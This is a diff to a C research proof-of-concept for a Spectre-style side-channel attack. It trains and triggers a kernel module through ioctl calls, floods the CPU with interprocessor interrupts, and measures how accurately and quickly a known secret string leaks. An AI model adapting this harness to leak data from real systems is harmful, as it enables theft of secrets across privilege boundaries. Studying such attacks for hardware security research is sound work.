@@ -30,7 +30,7 @@ struct ioctl_data {
 };
 
 
-void do_ioctl(int ctl_code)
+int do_ioctl(int ctl_code)
 {
     int ret;
     ret = ioctl(fd, ctl_code);
@@ -39,6 +39,7 @@ void do_ioctl(int ctl_code)
         close(fd);
         exit(EXIT_FAILURE);
     }
+    return ret;
 }
 
 int do_ioctl_data(int ctl_code, struct ioctl_data* data)
@@ -83,7 +84,9 @@ char spectre_read(char *secret, int offset)
 void victim_thread()
 {
     pin_cpu(VICTIM_CPU);
-    do_ioctl(IOCTL_COMMAND_HOLD);
+    int ret = do_ioctl(IOCTL_COMMAND_HOLD);
+    //printf("ret: %d\n", ret);
+    pthread_exit(0);
 }
 
 void start_victim()
@@ -122,15 +125,15 @@ int main(int argc, char** argv) {
     pin_cpu(ATTACKER_CPU);
 
     printf("\n");
-
+    clock_t start = clock();
     for (int i = 0; i < strlen(actual); i++)
     {
         for (int j = 0; j < 500; j++)
         {
-           
+            //printf("j %d\n", j);
             ipi_register(NUM_THREADS);
             timer_init(timer_length);
-            do_ioctl(IOCTL_COMMAND_TRAIN);
+            ret = do_ioctl(IOCTL_COMMAND_TRAIN);
             // Example of sending IOCTL command 2
             
             struct ioctl_data data;
@@ -143,39 +146,41 @@ int main(int argc, char** argv) {
             
             begin_ipi_storm();
             char c = do_ioctl_data(IOCTL_COMMAND_TRANSMIT, &data);
-            if (c == 255) // error
-                exit(EXIT_FAILURE);
-            if (c <= 31 || c >= 145)
+            if (c == actual[i])
             {
-                misses++;
-                continue;
+                hits++;
+                printf("%c", c);
+                fflush(stdout);
+                timer_cleanup();
+                kill_ipi();
+                pthread_join(victim, &ret);
+                do_ioctl(IOCTL_COMMAND_REALLOC);
+                break;
             }
             else
-            {
-                if (c == actual[i])
-                {
-                    hits++;
-                    printf("%c", c);
-                    break;
-                }
-                else
-                    misses++;
-                
-            }      
+                misses++;
+            ret = kill_ipi();    
+            
+            
             timer_cleanup();
-            kill_ipi();
-            do_ioctl(IOCTL_COMMAND_REALLOC);
+            pthread_join(victim, &ret);
+            ret = do_ioctl(IOCTL_COMMAND_REALLOC);
+            
+            //printf("here4\n");
         }
         
-    }
+    }   
     // Example of sending IOCTL command 1
-    
+    clock_t end = clock();
+    double cpu_time_used = ((double)(end-start))/CLOCKS_PER_SEC;
     printf("\n");
     // Close the device file
     close(fd);
+    printf("ret: %d\n", ret);
     
     float result = (float)hits / (float)(hits + misses);
 
     printf("Accuracy: %.2f --> hits=%ld, misses=%ld, total=%ld\n", result, hits, misses, hits + misses);
+    printf("Leak rate: %.2fb/s\n", (double)strlen(actual)/cpu_time_used);
     return EXIT_SUCCESS;
 }
